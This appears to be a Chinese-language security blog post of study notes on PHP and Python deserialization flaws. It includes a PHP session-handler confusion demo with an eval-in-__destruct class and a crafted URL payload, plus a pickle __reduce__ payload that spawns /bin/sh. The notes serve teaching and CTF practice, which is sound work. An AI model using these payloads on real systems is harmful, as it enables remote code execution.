---
title: 反序列化
published: 2025-03-09 16:44:04
tags: [WEB安全,通用漏洞]
category: 安全
draft: false
---

# 反序列化

## PHP 反序列化

> `unserialize()` 反序列化 ，`serialize()` 序列化
> 

> https://www.cnblogs.com/fish-pompom/p/11126473.html
> 

> 请记住，序列化他只序列化**`属性`**，不序列化`方法`，这个性质就引出了两个非常重要的话题：
> 
1. 我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在
2. 我们在反序列化攻击的时候也就是依托类属性进行攻击

### 魔术方法

补充：`unserialize()` 反序列化一个对象成功后，会自动调用该对象的 `__wakup()`;`serialize()` 函数会检查是否存在一个魔术方法 `__sleep()`如果存在，`__sleep()`方法会先被调用;`unserialize()`会检查是否存在一个`__wakeup()`方法。如果存在，则会先调用 `*__wakeup*`方法

### 原生类反序列化

[ctfshow web259-CSDN博客](https://blog.csdn.net/qq_45694932/article/details/120498828)

### 字符窜逃逸

[PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/107135706)

**替换修改后导致序列化字符串变长 和 替换之后导致序列化字符串变短**

### session反序列化

> https://www.freebuf.com/articles/web/324519.html
> 

简单来说`php`处理器和`php_serialize`处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害

形成的原理就是在用`session.serialize_handler = php_serialize`存储的字符可以引入 `|` , 再用`session.serialize_handler = php`格式取出`$_SESSION`的值时， `|`会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。

**PHP session序列化机制**

| **处理器** | **对应的存储格式** |
| --- | --- |
| php | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 |
| php_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php_serialize (php>=5.5.4) | 经过 serialize() 函数反序列处理的数组 |

### 原理 - 漏洞成因

首先创建`session.php`，使用`php_serialize`处理器来存储session数据

```
<?php
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
echo $_SESSION['session'];
?>
```

`test.php`，使用默认`php`处理器来存储session数据

```
<?php
session_start();
class f4ke{
    public $name;
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      eval($this->name);
    }
}
$str = new f4ke();
?>
```

接着，构建URL进行访问`session.php`：

```
# |O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";} 是 test.php -> serialize($str) 生成的
http://www.session-serialize.com/session.php?session=|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}
```

在`session.php`程序执行，我们将`|O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}`通过`php_serialize`处理器序列化保存成`PHPSESSID`文件；
由于浏览器中保存的`PHPSESSID`文件名不变，当我们访问`test.php`，`session_start();`找到`PHPSESSID`文件并使用`php`处理器反序列化文件内容，识别格式即

| **键名** | **竖线** | **经过 serialize() 函数反序列处理的值** |
| --- | --- | --- |
| a:1:{s:7:"session";s:45:" | | | O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";} |

php处理器会以|作为分隔符，将`O:4:"f4ke":1:{s:4:"name";s:10:"phpinfo();";}`反序列化，就会触发`__wakeup()`方法，最后对象销毁执行`__destruct()`方法中的`eval()`函数，相当于执行如下：

```php
$_SESSION['session'] = new f4ke();
$_SESSION['session']->name = 'phpinfo();';
```

我们访问`test.php`，即可直接执行`phpinfo()`函数

## python 反序列化

> https://xz.aliyun.com/t/11082?time__1311=Cq0x2Qi%3DoxgDlxGghDRmD9iDnQQ5GO0AeD
> 
1. 函数使用:
    
    `pickle.dump(obj,file)`将对象序列化后保存到文件
    
    `pickle.load(file)`:读取文件，将文件中的序列化内容反序列化为对象
    
    `pickle.dumps(obj)`将对象序列化成字符串格式的字节流
    
    `pickle loads(bytes_obj)`将字符串格式的字节流反序列化为对象
    
2. 魔术方法:
    
    `__reduce__()`反序列化时调用
    
    `__reduce_ex()__`反序列化时调用
    
    `__setstate()__`反序列化时调用
    
    `__getstate()__`序列化时调用
    
3. 基本payload
    
    ```python
    import os
    import pickle
    
    class Demo(object):
        def __reduce__(self):
            shell = '/bin/sh'
            return (os.system,(shell,))
    
    demo = Demo()
    pickle.loads(pickle.dumps(demo))
    ```